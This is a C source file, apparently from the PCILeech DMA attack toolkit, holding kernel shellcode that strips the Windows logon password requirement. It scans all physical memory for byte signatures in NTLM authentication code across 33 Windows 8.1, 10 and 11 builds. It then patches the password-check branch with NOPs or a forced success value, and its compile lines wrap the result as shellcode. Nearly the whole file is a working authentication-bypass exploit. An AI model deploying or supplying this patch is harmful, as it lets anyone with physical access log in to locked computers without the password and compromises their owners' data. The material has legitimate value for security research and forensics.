// wx64_unlock.c : kernel code to remove the password requirement when logging on to Windows.
//
// (c) Ulf Frisk, 2016-2020
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with (normal mode):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_unlock.c
// ml64.exe wx64_common_a.asm /Fewx64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_unlock.obj wx64_common.obj
// shellcode64.exe -o wx64_unlock.exe "WINDOWS UNLOCKER - REMOVE PASSWORD REQUIREMENT!                \n===============================================================\nREQUIRED OPTIONS:                                              \n  -0   : Set to one (1) in order to unlock.                    \n         Example: '-0 1'.                                      \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) =================%s\nNTSTATUS        : 0x%08X  \n===============================================================\n"
//
// compile with (standalone [8051] mode):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_unlock.c
// ml64.exe wx64_unlock_standalone.asm /Fewx64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_unlock.obj wx64_common.obj
// shellcode64.exe -o wx64_unlock.exe "DUMMY"
//
#include "wx64_common.h"

// ----------------------------- KERNEL DEFINES AND TYPEDEFS BELOW -----------------------------

typedef __int64					PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

typedef struct _PHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct _IDT_DESCRIPTOR {
	DWORD dwOpaque1;
	QWORD qwAddressISR;
	DWORD dwOpaque2;
} IDT_DESCRIPTOR, *PIDT_DESCRIPTOR;

typedef struct _IDTR {
	WORD nBytes;
	PIDT_DESCRIPTOR pIDT_DESCRIPTOR;
} IDTR, *PIDTR;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

//----------------------------------------------------------------------------------------------------------

#undef RtlCompareMemory
#undef RtlCopyMemory
typedef struct tdKERNEL_FUNCTIONS2 {
	VOID(*ExFreePool)(
		_In_ PVOID P);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	PPHYSICAL_MEMORY_RANGE(*MmGetPhysicalMemoryRanges)(
		VOID
		);
	PVOID(*MmMapIoSpace)(
		_In_  PHYSICAL_ADDRESS    PhysicalAddress,
		_In_  SIZE_T              NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	SIZE_T(*RtlCompareMemory)(
		_In_ const VOID   *Source1,
		_In_ const VOID   *Source2,
		_In_       SIZE_T Length
		);
	VOID(*RtlCopyMemory)(
		_Out_ VOID UNALIGNED *Destination,
		_In_ const VOID UNALIGNED *Source,
		_In_ SIZE_T Length
		);
} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	QWORD FUNC2[][2] = {
		{ &fnk2->ExFreePool,							H_ExFreePool },
		{ &fnk2->MmGetPhysicalAddress,					H_MmGetPhysicalAddress },
		{ &fnk2->MmGetPhysicalMemoryRanges,				H_MmGetPhysicalMemoryRanges },
		{ &fnk2->MmMapIoSpace,							H_MmMapIoSpace },
		{ &fnk2->MmUnmapIoSpace,						H_MmUnmapIoSpace },
		{ &fnk2->RtlCompareMemory,						H_RtlCompareMemory },
		{ &fnk2->RtlCopyMemory,							H_RtlCopyMemory }
	};
	for(QWORD j = 0; j < (sizeof(FUNC2) / sizeof(QWORD[2])); j++) {
		*(PQWORD)FUNC2[j][0] = PEGetProcAddressH(qwNtosBase, (DWORD)FUNC2[j][1]);
	}
}

//----------------------------------------------------------------------------------------------------------

typedef struct tdSignatureChunk {
	WORD cbOffset;
	BYTE cb;
	BYTE pb[13];
} SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;

typedef struct tdSignature {
	// in unlock mode: 
	//   chunk[0] = signature chunk 1 (required) 
	//   chunk[1] = signature chunk 2 (optional)
	//   chunk[2] = patch chunk (required)
	SIGNATURE_CHUNK chunk[3];
} SIGNATURE, *PSIGNATURE;

//----------------------------------------------------------------------------------------------------------

NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures)
{
	PBYTE pb;
	DWORD pgIdx, i;
	PSIGNATURE ps;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			if(!ps->chunk[0].cb || (ps->chunk[0].cb != fnk2->RtlCompareMemory(pb + ps->chunk[0].cbOffset, ps->chunk[0].pb, ps->chunk[0].cb))) {
				continue;
			}
			if(ps->chunk[1].cb && (ps->chunk[1].cb != fnk2->RtlCompareMemory(pb + ps->chunk[1].cbOffset, ps->chunk[1].pb, ps->chunk[1].cb))) {
				continue;
			}
			fnk2->RtlCopyMemory(pb + ps->chunk[2].cbOffset, ps->chunk[2].pb, ps->chunk[2].cb);
			return S_OK;
		}
	}
	return E_FAIL;
}

#define NUMBER_OF_SIGNATURES 33
NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
{
	SIGNATURE oSigs[] = {
		// win8.1x64 msv1_0.dll (2014-10-29)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x42, 0xA4 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0x46, 0x88 } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// win8.1x64 msv1_0.dll (2015-10-30)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0xC2, 0x07 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xCE, 0xBC } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// win8.1x64 msv1_0.dll (2016-03-16)
		{ .chunk = {
			{ .cbOffset = 0x5df,.cb = 4,.pb = { 0xFF, 0x15, 0x22, 0x04 } },
			{ .cbOffset = 0x5e8,.cb = 4,.pb = { 0x0F, 0x85, 0xB2, 0xB9 } },
			{ .cbOffset = 0x5e8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// AUTO-GENERATED SIGNATURES BELOW:
		
		
		
		
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.16384 / 2015-07-10]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.18366 / 2019-09-30]
		{.chunk = {
			{.cbOffset = 0x5DC,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x4B, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x5E8,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x5E8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19387 / 2022-08-04]
		{.chunk = {
			{.cbOffset = 0x65C,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xCB, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x668,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x668,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19869 / 2023-03-30]
		{.chunk = {
			{.cbOffset = 0x66C,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xBB, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x678,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x678,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.10586.0 / 2015-10-30]
		{.chunk = {
			{.cbOffset = 0x62C,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xB3, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x638,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x638,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.0 / 2016-07-16]
		{.chunk = {
			{.cbOffset = 0x6DC,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xD3, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x6E8,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x6E8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.2791 / 2019-02-06]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.3269 / 2019-09-29]
		{.chunk = {
			{.cbOffset = 0x6EC,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xC3, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x6F8,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x6F8,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5291 / 2022-08-07]
		{.chunk = {
			{.cbOffset = 0x76C,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x43, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x778,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x778,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5850 / 2023-03-30]
		{.chunk = {
			{.cbOffset = 0x77C,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x33, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x788,.cb = 6,.pb = { 0x0F, 0x85, 0x18, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x788,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.1631 / 2019-02-06]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.2106 / 2019-09-30]
		{.chunk = {
			{.cbOffset = 0x622,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xB5, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x62E,.cb = 6,.pb = { 0x0F, 0x85, 0x2E, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x62E,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.15254.245 / 2018-01-30]
		{.chunk = {
			{.cbOffset = 0x612,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xC5, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x61E,.cb = 6,.pb = { 0x0F, 0x85, 0x2E, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x61E,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1268 / 2019-07-05]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1448 / 2019-10-02]
		{.chunk = {
			{.cbOffset = 0x622,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xC5, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x62E,.cb = 6,.pb = { 0x0F, 0x85, 0x2E, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x62E,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.192 / 2018-01-01]
		{.chunk = {
			{.cbOffset = 0x612,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xD5, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x61E,.cb = 6,.pb = { 0x0F, 0x85, 0x2E, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x61E,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.1067 / 2019-10-02]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.590 / 2019-02-06]
		{.chunk = {
			{.cbOffset = 0x6A2,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x45, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x6AE,.cb = 6,.pb = { 0x0F, 0x85, 0x2E, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x6AE,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.523 / 2019-01-01]
		{.chunk = {
			{.cbOffset = 0x692,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x55, 0x1C, 0x00, 0x00 } },
			{.cbOffset = 0x69E,.cb = 6,.pb = { 0x0F, 0x85, 0x2E, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x69E,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.10935 / 2022-08-05]
		{.chunk = {
			{.cbOffset = 0x7CD,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x22, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x7D9,.cb = 6,.pb = { 0x0F, 0x84, 0x0B, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x7D9,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.194 / 2018-12-04]
		{.chunk = {
			{.cbOffset = 0x73D,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xB2, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x749,.cb = 6,.pb = { 0x0F, 0x84, 0x0B, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x749,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.316 / 2019-02-06]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.802 / 2019-10-02]
		{.chunk = {
			{.cbOffset = 0x74D,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xA2, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x759,.cb = 6,.pb = { 0x0F, 0x84, 0x0B, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x759,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.5122 / 2023-11-08]
		{.chunk = {
			{.cbOffset = 0x7DD,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x12, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x7E9,.cb = 6,.pb = { 0x0F, 0x84, 0x0B, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x7E9,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.1 / 2019-03-18]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.10022 / 2019-09-15]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.418 / 2019-10-06]
		{.chunk = {
			{.cbOffset = 0x72F,.cb = 9,.pb = { 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xC0, 0x1B, 0x00, 0x00 } },
			{.cbOffset = 0x73B,.cb = 6,.pb = { 0x0F, 0x84, 0x09, 0xFB, 0xFF, 0xFF } },
			{.cbOffset = 0x73B,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.1 / 2019-12-07]
		{.chunk = {
			{.cbOffset = 0x423,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x53, 0x20, 0x00, 0x00 } },
			{.cbOffset = 0x435,.cb = 6,.pb = { 0x0F, 0x84, 0xBA, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0x435,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2728 / 2023-03-09]
		{.chunk = {
			{.cbOffset = 0x4B3,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xC3, 0x1F, 0x00, 0x00 } },
			{.cbOffset = 0x4C5,.cb = 6,.pb = { 0x0F, 0x84, 0xBA, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0x4C5,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2965 / 2023-04-27]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3636 / 2023-10-20]
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3684 / 2023-10-17]
		{.chunk = {
			{.cbOffset = 0x4C3,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xB3, 0x1F, 0x00, 0x00 } },
			{.cbOffset = 0x4D5,.cb = 6,.pb = { 0x0F, 0x84, 0xBA, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0x4D5,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.4474 / 2024-05-18]
		{.chunk = {
			{.cbOffset = 0x583,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xF3, 0x1E, 0x00, 0x00 } },
			{.cbOffset = 0x595,.cb = 6,.pb = { 0x0F, 0x84, 0xBA, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0x595,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.20348.1668 / 2023-03-30]
		{.chunk = {
			{.cbOffset = 0xA7B,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xA3, 0x28, 0x00, 0x00 } },
			{.cbOffset = 0xA8D,.cb = 6,.pb = { 0x0F, 0x84, 0xB2, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0xA8D,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.20348.887 / 2022-08-04]
		{.chunk = {
			{.cbOffset = 0xA6B,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xB3, 0x28, 0x00, 0x00 } },
			{.cbOffset = 0xA7D,.cb = 6,.pb = { 0x0F, 0x84, 0xB2, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0xA7D,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.1696 / 2023-03-09]
		{.chunk = {
			{.cbOffset = 0x00B,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xE3, 0x22, 0x00, 0x00 } },
			{.cbOffset = 0x01D,.cb = 6,.pb = { 0x0F, 0x84, 0xB2, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0x01D,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.2600 / 2023-11-08]
		{.chunk = {
			{.cbOffset = 0x01B,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0xD3, 0x22, 0x00, 0x00 } },
			{.cbOffset = 0x02D,.cb = 6,.pb = { 0x0F, 0x84, 0xB2, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0x02D,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.778 / 2022-06-18]
		{.chunk = {
			{.cbOffset = 0xF8B,.cb = 10,.pb = { 0x48, 0x8B, 0xCB, 0x48, 0xFF, 0x15, 0x63, 0x23, 0x00, 0x00 } },
			{.cbOffset = 0xF9D,.cb = 6,.pb = { 0x0F, 0x84, 0xB2, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0xF9D,.cb = 2,.pb = { 0x0F, 0x85 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2067 / 2023-07-11]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2506 / 2023-10-19]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2567 / 2023-10-14]
		{.chunk = {
			{.cbOffset = 0xFC9,.cb = 11,.pb = { 0x48, 0x8D, 0x4B, 0x10, 0x48, 0xFF, 0x15, 0x2C, 0x23, 0x00, 0x00 } },
			{.cbOffset = 0xFDC,.cb = 6,.pb = { 0x0F, 0x85, 0xC4, 0xFA, 0xFF, 0xFF } },
			{.cbOffset = 0xFDC,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
		},
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.1 / 2024-04-01]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.1150 / 2024-07-03]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.1591 / 2024-08-21]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.1882 / 2024-09-28]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.2454 / 2024-11-16]
		// Signature for Windows 11 x64 [NtlmShared.dll 10.0.26100.712 / 2024-05-16]
		{.chunk = {
			{.cbOffset = 0xB31,.cb = 13,.pb = { 0x4D, 0x2B, 0xF5, 0x75, 0xEF, 0x84, 0xD2, 0x74, 0x0A, 0x32, 0xC0, 0xEB, 0x09 } },
			{.cbOffset = 0xB3A,.cb = 2,.pb = { 0x32, 0xC0 } },
			{.cbOffset = 0xB3A,.cb = 2,.pb = { 0xB0, 0x01 } } }
		},

	};
	KERNEL_FUNCTIONS2 fnk2;
	PPHYSICAL_MEMORY_RANGE pMemMap, pMM;
	SIZE_T i, cMemMap;
	QWORD qwBaseAddress = 0;
	PVOID pvMemory;
	NTSTATUS nt;
	// 1: Intialize function table
	InitializeKernelFunctions2(qwAddrNtosBase, &fnk2);
	// 2: Retrieve physical memory map
	pMemMap = fnk2.MmGetPhysicalMemoryRanges();
	if(pMemMap == NULL) {
		return E_FAIL;
	}
	for(cMemMap = 0; pMemMap[cMemMap].BaseAddress || pMemMap[cMemMap].NumberOfBytes; cMemMap++);
	// 3: Search memory and unlock if signature is found
	while(qwBaseAddress + 0x10000 <= pMemMap[cMemMap - 1].BaseAddress + pMemMap[cMemMap - 1].NumberOfBytes) {
		for(i = 0; i < cMemMap; i++) {
			pMM = &pMemMap[i];
			if(((pMM->BaseAddress < qwBaseAddress) && (pMM->BaseAddress + pMM->NumberOfBytes > qwBaseAddress + 0x10000))) {
				// is inside range!
				pvMemory = fnk2.MmMapIoSpace(qwBaseAddress, 0x10000, 0);
				if(pvMemory) {
					nt = Unlock_FindAndPatch(&fnk2, pvMemory, 0x10000 / 0x1000, oSigs, NUMBER_OF_SIGNATURES);
					fnk2.MmUnmapIoSpace(pvMemory, 0x10000);
					if(NT_SUCCESS(nt)) {
						// found and patched! - exit!
						goto cleanup;
					}
				}
				break;
			}
		}
		qwBaseAddress += 0x10000;
	}
	nt = E_FAIL;
cleanup:
	fnk2.ExFreePool(pMemMap);
	return nt;
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	if(pk->dataIn[0] == 1) {
		pk->dataOut[0] = (QWORD)Unlock(pk->AddrKernelBase);
	} else {
		pk->dataOut[0] = ERROR_INVALID_PARAMETER;
	}
}